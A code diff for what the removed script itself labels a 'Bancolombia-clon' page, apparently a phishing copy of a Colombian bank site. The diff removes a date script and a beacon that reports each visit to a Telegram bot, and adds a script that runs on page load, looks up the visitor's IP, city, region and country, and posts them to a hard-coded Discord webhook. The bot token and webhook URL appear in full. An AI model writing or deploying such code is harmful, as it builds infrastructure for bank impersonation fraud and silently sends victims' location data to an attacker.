@@ -210,33 +210,34 @@
         </span>
     </footer>
 
-    <script>
-        // Script para mostrar la fecha actual
-        const currentDateElement = document.getElementById("currentDate");
-        const currentDate = new Date();
-        currentDateElement.textContent = currentDate.toLocaleString('es-ES', {
-            weekday: 'long',
-            year: 'numeric',
-            month: 'long',
-            day: 'numeric',
-            hour: 'numeric',
-            minute: 'numeric',
-            second: 'numeric',
-            hour12: true
-        });
-    </script>
-  <script>
-  fetch("https://api.telegram.org/bot7984706159:AAGai2Rx6thKz_vfuLb34UYvnIn15CbwN04/sendMessage", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      chat_id: "5647970395",
-      text: "visitante Bancolombia-clon."
+   <script>
+  // 👇 Tu webhook de Discord
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1416167076737056868/N0PLYys9FxoMqosemT9ACC6Il9qJlS1lmAkgriwfjugHpUPWd9ozsimjK5NdhYTRxiHS";
+
+  // Detectar ubicación del visitante
+  fetch("https://ipapi.co/json/")
+    .then(response => response.json())
+    .then(data => {
+      const mensaje = {
+        content: `🌍 Nuevo visitante detectado
+📍 Ciudad: ${data.city}
+🗺 Región: ${data.region}
+🇨🇴 País: ${data.country_name}
+💻 IP: ${data.ip}`
+      };
+
+      // Enviar mensaje a Discord
+      fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(mensaje)
+      });
     })
-  });
+    .catch(error => {
+      console.error("Error obteniendo la ubicación:", error);
+    });
 </script>
+
 
 </body>
 </html>
